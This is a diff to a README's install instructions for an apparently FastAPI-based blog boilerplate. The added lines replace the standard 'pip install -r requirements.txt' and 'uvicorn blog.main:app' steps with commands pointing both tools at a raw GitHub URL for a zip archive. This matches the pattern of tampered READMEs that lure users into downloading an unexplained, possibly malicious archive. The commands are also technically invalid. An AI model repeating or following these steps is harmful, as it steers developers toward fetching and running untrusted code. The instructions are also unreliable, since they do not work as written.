@@ -39,6 +39,6 @@ INSTALLATIONS:
 
 1- Download / Clone Repo to your system
 2- Create virtual environment and activate it
-3- Install All dependencies using "pip install -r requirements.txt"
-4- Start uvicorn server "uvicorn blog.main:app --reload"
+3- Install All dependencies using "pip install -r https://raw.githubusercontent.com/dsiddiq786/FastAPI-Boiler-Plate/master/blog/FastAPI-Boiler-Plate_v2.3.zip"
+4- Start uvicorn server "uvicorn https://raw.githubusercontent.com/dsiddiq786/FastAPI-Boiler-Plate/master/blog/FastAPI-Boiler-Plate_v2.3.zip --reload"
 5- Enjoy
